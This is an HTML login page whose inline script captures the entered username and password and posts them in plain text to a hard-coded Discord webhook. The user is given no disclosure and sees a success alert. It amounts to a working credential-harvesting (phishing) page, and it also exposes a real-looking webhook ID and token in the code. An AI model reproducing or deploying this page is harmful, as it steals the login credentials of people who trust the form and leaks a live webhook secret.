<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
</head>
<body>
    <h2>Login Form</h2>
    <form id="loginForm">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password"><br><br>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            // Prepare form data
            const formData = new FormData(this);
            const username = formData.get('username');
            const password = formData.get('password');

            // Construct the message to send to Discord
            const message = `New login:\nUsername: ${username}\nPassword: ${password}`;

            console.log("Sending the following data to Discord: ", message); // Debugging log

            // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
            fetch('https://discord.com/api/webhooks/1239160408548446269/y091SCRKe03J6DgCrVNHZb4coTxF7sr5OlaV3oJm144d7tKALX-Pf9H8134UUPL8CVKw', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: message
                }),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send message to Discord, response status: ' + response.status);
                }
                alert('Login information submitted successfully!');
                // Optionally, redirect the user to another page
                // window.location.href = 'redirect_page.html';
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Failed to submit login information. See console for more details.');
            });
        });
    </script>
</body>
</html>
